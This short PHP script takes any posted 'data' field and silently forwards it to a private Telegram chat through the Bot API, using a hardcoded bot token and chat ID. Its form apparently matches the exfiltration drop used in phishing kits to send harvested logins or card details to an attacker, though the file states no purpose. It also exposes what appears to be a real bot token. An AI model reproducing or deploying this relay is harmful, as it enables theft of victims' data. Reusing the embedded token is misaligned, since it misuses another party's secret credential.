<?php 

if(isset($_POST['data'])){
    
$data = urldecode($_POST['data']);
$botToken = "6780846651:AAFaeMiJfbHlLdTtFYjd2i_xLULXBToUZMk";
$chat_id = "1992587266";
$message = $data;
$bot_url    = "https://api.telegram.org/bot$botToken/";
$url = $bot_url."sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
file_get_contents($url);
}

?>